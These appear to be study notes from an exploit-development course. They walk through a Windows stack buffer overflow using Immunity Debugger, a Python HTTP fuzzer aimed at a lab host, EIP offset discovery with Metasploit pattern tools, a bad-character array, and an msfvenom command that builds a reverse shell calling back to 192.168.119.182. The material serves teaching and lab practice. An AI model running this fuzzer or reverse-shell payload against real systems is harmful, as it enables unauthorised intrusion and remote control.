Immunity Debugger has 4 panes:
TL: Assembly instructions that make the application run.
TR: Registers, their addresses and the commands they have queued. 
LL: Memory contents at a given address
LR: The Stack and its contents

LL Pane is good for searching the application for specific things.

Applications initiate in a halted state, and you step through them 
at different increments depending on what you are looking for.
Debug > Step (F7) will follow execution flow into a given function call
Debug > Step Over (F8) will execute an entire function and return from it.

The Example Code we are Debugging is as Follows:
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[64];
	if (argc < 2)
	{
		printf("Error - You must supply at least one argument\n");	
		return 1;
	}
	strcpy(buffer, argv[1]);	
  return 0;
}

There is an obvious buffer overflow here. If we want to fuzz for it in debugger, 
we need to find the main function. RClick on TL pane to Search for All Referenced
Text Strings. This will bring up the error message, which will act as a landmark.

DblClick on the Error message and you will return to the disassembly window 
	inside the main function. strcpy will be close by, and we can locate it with
	ease. 
Placing a breakpoint (F2) on the strcpy function will make sure the program
	stops executing whenever we pass the fxn we are interested in. 
Run the program with (F9) and execution will stop at the breakpoint. 
Stepping into the strcpy function (F7) will change TL to show the
	function instructions of strcpy. Note the return address of 
	the function. The return address will be what we want to watch
	when we determine whether or not the buffer has been overridden.

The buffer is 64 bytes, so sending more than 64 will cause the buffer to 
	overflow. The offset between the buffer address and the main 
	function return address needs to be found. By supplying that 
	many bytes to the program, you can take over the EIP. 
The EIP register is used by the CPU to direct code execution at the 
	assembly level, so we want to be able to feed it shellcode as 
	an endgame. 

Discovering a vulnerability in the code is easier with the source. Here's
	how to do it without access to the source on Windows and Linux, 
	gain control of the important registers and get reliable RCE:

You can reverse engineer or fuzz the application. Fuzzing is the more common 
	technique because reversing is a pain in the ass. Fuzzing is when 
	you test every possible input of a program to try and crash it. 
THIS DOES NOT SOLELY APPLY TO BINARIES. You can fuzz webapps for crash params
	and get overflow exploits on them as well. When you fuzz, write a script
	that iterates an increasing parameter send until it gets so big you either 
	give up or crash the application. Example iteration would be 100 characters 
	step 100 characters to 2000 characters. Running the fuzzer until a crash
	then decreasing the step increment until you have the exact characters
	is how you complete the fuzzing. 

EXAMPLE FUZZING SCRIPT:
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()


WINDOWS MEMORY PROTECTION SYSTEMS:
Windows has protections in place to prevent unauthorized EIP control.
Three popular ones are:
	Data Execution Prevention (DEP)
		Hardware and software checks on memory to prevent malicious
		code from running on the system. Primarily used for data pages.
		Raises an exception when things look awry.
	Address Space Layout Randomization (ASLR)
		Randomizes the base addresses of loaded applications and DLLs
		every time the OS is booted. XP and earlier load the DLLs in 
		the same address every time making exploitation 1 step simpler.
	Control Flow Guard (CFG)
		Microsoft proprietary Control-Flow Integrity implementation.
		Performs validation of indirect code branching,
		preventing function pointer overwrites.

CONTROLLING THE EIP:
Binary Tree Analysis is an easy way to modify your fuzzer to get the location of
your overflow. This is when you take your 800 byte buffer of As and turn it into a 
400 A, 400 B string. If you see B's in the EIP you change the Bs to 200 Bs and 200 Cs.
Keep paring down until you know your position. This should happen in 7 iterations, but
there is a faster way. This quicker way involves using a string of nonrepeating 4 byte
chunks as the fuzzing output such as Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
Using the unique pattern we can identify exactly with 1 pass the location of the EIP in 
the buffer. There is a msf-pattern-create script that will do this for us. 

locate pattern_create will show you the location.
msf-pattern_create -l 800 will show you an 800 character string that doesn't repeat.
The EIP will show a hex string, you decode it and then you can use msf-pattern_offset
to figure out exactly where the string is
msf-pattern_offset -l 800 -q <HEX> will show you the exact offset location of your
hex string if you supplied an 800 character buffer. The offset is the location of 
the START OF THE EIP, so you are going to put your shellcode in the bytes AFTER 
THE PROVIDED OFFSET POSITION. So your buffer should be:
	filler + eip + buffer(extra in case you fuck up)
Once you see how you have controlled the EIP, you need to make space for your shellcode.

MAKING ROOM FOR SHELLCODE:
We want to include shellcode as part of the input buffer that is causing the program to crash.
This way, when the program crashes, its last instruction will be to give you a shell. 
A standard reverse shell requires 350-400 bytes of space. You will need to adjust the 
size of your buffer to see if there is enough space for the payload without changeing 
the nature of the crash. Change your buffer to:
	filler + eip + offset + buffer
Observe the ESP location at the time of the crash with the controlled EIP. Check to
see if you have enough room following that stack location. Before we write the payload
we have to first check for bad characters. The application may have a number of bad 
characters that we can't use. One way to do this is to send all possible characters:
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

After sending these at the end of the buffer, right click the ESP register and select
Follow in Dump to show the input buffer hex characters in memory. Characters which 
do not appear in the dump are bad characters. Once you do this, you will have control
of the EIP, have space for your shellcode and know which characters you cannot include.
The ESP address changes between crashes, so we can't just hard code an address into the 
exploit. 

When you get your bad characters you need to tell msfvenom they are bad with the 
-b flag:

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.182 LPORT=42069 EXITFUNC=thread -f raw -b x00x0ax1ax2fx95xa7 -o exploit.txt


FINDING A RETURN ADDRESS:
To ensure we have a consistent place to leverage our shellcode we can capture 
the JMP ESP instruction. This will jump to the address in the ESP when executed.
If we find a static address with this instruction, we can redirect the EIP to 
that address, ensuring we always get the code to run. 


